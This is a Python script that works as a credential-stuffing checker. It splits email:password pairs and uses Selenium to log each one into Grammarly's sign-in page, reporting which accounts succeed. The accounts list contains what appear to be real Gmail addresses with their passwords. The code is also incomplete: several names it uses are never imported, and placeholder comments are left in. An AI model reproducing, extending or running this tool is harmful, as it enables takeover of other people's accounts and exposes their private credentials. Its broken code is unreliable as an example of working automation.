from email_validator import validate_email, EmailNotValidError

def is_email_valid(email):
    try:
        v = validate_email(email)
        return True
    except EmailNotValidError as e:
        # Invalid email address
        return False

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options

def is_loggable(email, password):
    options = Options()
    options.headless = False  # Set headless mode to False
    driver = webdriver.Chrome(service=Service(r'C:\Users\fahad\Downloads\grammarly_checker\chromedriver.exe'), options=options)
    # ... rest of your code ...

    # ... rest of your code ...
    driver.get('https://www.grammarly.com/signin?skip_select_account=1')

    email_field = driver.find_element_by_css_selector('#email')
    password_field = driver.find_element_by_css_selector('#password')

    email_field.send_keys(email)
    password_field.send_keys(password)
    password_field.send_keys(Keys.RETURN)

    # Wait for the page to load and check if the login was successful
    # This is a placeholder and will depend on the actual behavior of the Grammarly login page
    try:
        WebDriverWait(driver,  10).until(EC.presence_of_element_located((By.ID, 'logoutButton')))
        return True
    except TimeoutException:
        return False
    finally:
        driver.quit()

def check_credentials(accounts):
    for account in accounts:
        email, password = account.split(':')
        if is_email_valid(email):
            if is_loggable(email, password):
                print(f"Account {email} is loggable.")
            else:
                print(f"Account {email} is not loggable.")
        else:
            print(f"Invalid email address: {email}")

accounts = [
    "labanca2908@gmail.com:Amor2312",
    "manikanthreddy31970@gmail.com:Manikanth@123",
    # ... add more accounts here
]

check_credentials(accounts)
